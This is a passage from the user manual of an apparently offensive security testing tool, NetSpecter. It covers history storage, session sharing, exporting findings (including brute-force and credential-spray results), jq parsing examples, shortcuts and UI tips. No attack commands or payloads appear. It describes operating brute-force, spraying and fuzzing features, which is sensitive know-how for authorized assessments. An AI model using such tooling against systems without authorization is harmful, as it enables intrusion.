| **macOS** | `~/Library/Application Support/netspectre/proxy-history.db` |
| **Linux** | `~/.config/netspectre/proxy-history.db` |

##### SQLite Size Management

The proxy history database grows with every captured request. On a busy assessment, it can reach hundreds of megabytes. To manage size:

1. **Clear from UI:** Use the **Clear History** button in the proxy panel — this truncates all tables but keeps the database file
2. **Delete the file:** Close NetSpecter, delete the `.db` file at the path above, and restart. A fresh database is created automatically.
3. **Selective clearing:** The Clear History button removes all entries. There is no selective date-range deletion in the UI — for that, use a SQLite tool like `sqlite3` or DB Browser for SQLite.

#### Session File Versioning

Session files are forward-compatible within the same major version. A session saved in NetSpecter 1.18 can be loaded in 1.20. However, new fields added in later versions (e.g., cloud enumeration findings added in 1.19) will be empty when loading an older session file. NetSpecter does not modify or upgrade old session files — it simply ignores missing fields.

#### Sharing Sessions

Before sharing a session file with a teammate or including it in a report:

1. **Sanitize credentials:** If the session was saved after a credential spray or brute force, credential data is NOT in the JSON (memory-only). However, service banners may contain authentication details if a banner grab captured an HTTP response with credentials.
2. **Sanitize personal IPs:** Your scanning machine's IP may appear in OAST callback URLs, reverse shell configurations, or scan metadata.
3. **Check for PII:** SNMP walk results may contain hostnames, usernames, or other personally identifiable information from the target environment.

### Exporting Individual Feature Data

Most features have their own export options:

| Feature | Export Format | What Is Included | How to Access |
| --- | --- | --- | --- |
| Proxy History | HAR 1.2 JSON | Full request/response pairs with timing, headers, bodies, cookies | Proxy tab then Export HAR |
| Scanner Findings | JSON / CSV / HTML | Severity, module, URL, parameter, evidence, description, remediation, references | Scanner tab then Export |
| Cloud Enum Findings | JSON | Probe name, severity, endpoint URL, raw response, remediation | Cloud Enum panel then Export |
| Dir Fuzzer Results | CSV | Status code, path, response size, duration | Dir Fuzz panel then Export CSV |
| Brute Force Results | CSV | Timestamp, protocol, host, port, username, password, status | Brute Force modal then Export |
| Credential Spray | CSV | Protocol, host, port, username, password, status | Cred Spray panel then Export |
| SNMP Walk Data | Clipboard / text | Full OID tree with values | SNMP results then Copy |
| WS Fuzzer Results | CSV | Index, payload, response, duration, upgraded, error_type, timed_out, anomaly | WS Fuzz panel then Export CSV |
| Topology Graph | PNG | Visual network graph as rendered on screen | Topology tab then Camera icon |

#### Automation Workflow

Exported JSON files (scanner findings, cloud enum findings, session data) can be consumed by external tools:

```bash
# Parse scanner findings with jq
cat scanner-findings.json | jq '.[] | select(.severity == "Critical") | .url'

# Count findings by module
cat scanner-findings.json | jq 'group_by(.module) | map({module: .[0].module, count: length})'

# Extract all discovered IPs from a session file
cat session.json | jq '.hosts[].ip'
```

> **Worked example:** After completing an assessment, you export scanner findings as JSON and session data as JSON. You use `jq` to extract all Critical findings and pipe them into a markdown table generator for your report. The cloud enum JSON is included as an appendix. The HAR export is shared with the development team so they can replay the exact requests that triggered vulnerabilities.

---

## 21. Keyboard Shortcuts & UI Tips

### Global Shortcuts

| Shortcut | Action |
| --- | --- |
| `Ctrl+S` / `Cmd+S` | Save session to JSON file |
| `Ctrl+O` / `Cmd+O` | Load session from JSON file |
| `Escape` | Close the topmost open modal or side panel |
| `Ctrl+Shift+I` / `Cmd+Option+I` | Open Electron DevTools (development builds only) |
| `Ctrl+F` / `Cmd+F` | Focus the search/filter input in the current view |
| `F5` | Refresh the current view (re-renders host grid without rescanning) |
| `Ctrl+W` / `Cmd+W` | Close the current Repeater tab (when Repeater is focused) |
| `Ctrl+T` / `Cmd+T` | Open a new Repeater tab (when Repeater is focused) |

### Panel Resize Tips

- **Drag the divider handle** between the host grid and the Details panel to resize. The divider is a thin vertical bar that changes cursor to a resize arrow on hover.
- **Double-click the divider** to reset it to the default 60/40 split.
- **Minimum widths:** The host grid has a minimum width of 300px. The Details panel has a minimum width of 350px.
- **Maximum widths:** Either panel can expand up to 80% of the window width.
- The same resize behavior applies to the Share Explorer split pane, the Repeater request/response split, and the Comparer left/right split.

### Right-Click Context Menu Reference

| Context Target | Available Actions |
| --- | --- |
| **Host card** | Deep Scan, Nmap Vuln Scan, Brute Force, Default Cred Spray, Dir Fuzz, Enumerate Shares, Cloud Enum, Capture Packets, Send to Scanner, Copy IP, Remove from Scope |
| **Port badge (Host Details)** | Targeted Nmap Scan, Open in Browser (HTTP ports), Brute Force, Dir Fuzz, Send to Scanner, Ncat Connect, Copy Port Number |
| **Proxy History row** | Send to Repeater, Send to Intruder, Send to Scanner, Send to Comparer (Left), Send to Comparer (Right), Copy URL, Copy as cURL, Delete Request |
| **Sitemap endpoint** | Send to Repeater, Send to Scanner, Send to Intruder, Copy URL, Open in Browser |
| **Scanner finding** | Send to Repeater, Copy Evidence, Copy URL |
| **Intruder result row** | Send to Repeater, Send to Comparer, Copy Response |
| **Topology node** | Open Host Details, Deep Scan, Copy IP |

### Drag and Drop Support

| Drop Target | Accepted File Types | What Happens |
| --- | --- | --- |
| **Add Hosts modal** | `.txt`, `.csv` | Imported as target list (one per line) |
| **Add Hosts modal** | `.xml` (Nmap XML) | Parsed as Nmap XML import |
| **Brute Force modal** | `.txt` | Loaded as username or password wordlist |
| **Intruder payload area** | `.txt` | Loaded as payload wordlist |
| **Dir Fuzzer wordlist** | `.txt` | Loaded as custom wordlist |

### UI Tips Reference

| Tip | Detail |
| --- | --- |
| **Dependency indicators** | Buttons and sections that require an uninstalled external tool are hidden entirely rather than shown as disabled, keeping the UI clean. |
| **Consent gate recovery** | If you accidentally dismiss the pentest consent gate, it reappears the next time you attempt an offensive action. It only auto-dismisses after explicit acceptance, not on close/escape. |
| **Auto-updates** | NetSpecter checks for updates on startup. When a new version is available, a banner appears with a one-click download. Updates are applied on next restart. |
| **Port badges are clickable** | Click any blue port badge in the Details panel to trigger a targeted Nmap service scan on that specific port (requires Nmap mode). |
| **Network to Web pivot** | Clicking "Dir Fuzz" or "Send to Scanner" on any HTTP port automatically opens the Web App workspace with that URL pre-loaded. |
| **Web to Network pivot** | Scanner findings automatically inject Web Vuln badges onto host cards in the Network workspace. |
| **Bulk selection** | Hold `Shift` and click to select a range of hosts in List or Table view. Hold `Ctrl`/`Cmd` and click to select individual hosts. |
| **Quick copy** | Double-click any IP address, port number, or URL in the UI to select and copy it. |
| **Panel memory** | Panel widths and positions are remembered for the session. Closing and reopening a panel restores its last size. |
| **Filter persistence** | Search filters remain active when switching between view modes (Grid, List, Table). Clear the filter input to show all hosts. |
| **Tooltip details** | Hover over any badge (CVE count, Web Vuln, OS, vendor) to see a tooltip with additional details without opening the Host Details panel. |
| **Export shortcuts** | Most export buttons support `Ctrl+Click` to use the last-used save path without showing the file dialog. |
